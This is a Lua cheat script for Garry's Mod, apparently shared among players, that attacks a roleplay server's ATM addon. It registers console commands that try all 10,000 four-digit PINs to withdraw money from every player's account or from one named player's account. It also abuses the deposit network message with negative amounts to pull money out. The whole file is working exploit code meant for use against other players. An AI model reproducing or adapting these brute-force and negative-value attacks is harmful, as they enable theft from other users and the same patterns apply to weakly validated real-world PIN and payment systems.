--[[
Lennys Scripts by Lenny. (STEAM_0:0:30422103)
Modified by Ott (STEAM_0:0:36527860)
This work is licensed under the Creative Commons Attribution-NonCommercial-ShareAlike 3.0 Unported License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-sa/3.0/.
Credit to the author must be given when using/sharing this work or derivative work from it.
Thanks to Meepdarkeness for reducement of packet loss
]]

local breake = 0
local function realDeposit(num, amount, memo)
	net.Start("ATM_DepositMoney_C2S")
		net.WriteTable({Memo = memo,Num=tostring(num),Amount=amount})
	net.SendToServer()
end
local function realRegister(num, name, pass)
	net.Start("ATM_CreateAccount_C2S")
		net.WriteTable({Num=tostring(num),Name=name,Password=pass})
	net.SendToServer()
end

local function bruteforce()

	local pintable = {}

	for i=0, 9 do
		table.insert(pintable, "000"..i)
	end

	for i = 10, 99 do
		table.insert(pintable, "00"..i)
	end

	for i = 100, 999 do
		table.insert(pintable, "0"..i)
	end

	for i = 1000, 9999 do
		table.insert(pintable, i)	
	end

	local function bruteforceall( ply, cmd, args )
		MsgC(Color(0,255,0), "\nBruteforcing...\n")
		for k, v in pairs(player.GetAll()) do
			for _, pin in pairs(pintable) do
				timer.Simple(tonumber(pin)*.015, function() 
				RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), v:UniqueID(), args[1])
				if breake == 1 then
					breake = 0
					return
				end
				end)
			end
		end
	end

	local function bruteforceply( ply, cmd , args )
		MsgC(Color(0,255,0), "\nBruteforcing...\n")
		for k, v in pairs(player.GetAll()) do
			if string.find(string.lower(v:Name()), string.lower(args[1])) then
				for _, pin in pairs(pintable) do
					timer.Simple(tonumber(pin)*.01, function()
					MsgC(Color(0,255,0), "\nChecking: "..pin.."\n")
					RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), v:UniqueID(), args[2])
					if breake == 1 then
						breake = 0
						return
					end
					end)
				end
			end
		end
	end

	concommand.Add("lenny_atmbruteforce_all", bruteforceall) 

	concommand.Add("lenny_atmbruteforce_ply", bruteforceply) 


	MsgC(Color(0,255,0), "\nInitialzed!!\n")

end




concommand.Add("lenny_atmbruteforce", bruteforce) 
concommand.Add("lenny_realistic_atm_register", function(ply, cmd, args, fullstring)
	realRegister(unpack(args))
end)
concommand.Add("lenny_realistic_atm_deposit", function(ply, cmd, args, fullstring)
	realDeposit(args[1], tonumber(args[2]), args[3] or "")
end)
concommand.Add("lenny_realistic_atm_withdrawal", function(ply, cmd, args, fullstring)
	realDeposit(args[1], -tonumber(args[2]), args[3] or "")
end)

MsgC(Color(0,255,0), "\nLennys atm bruteforce initialized!\n")
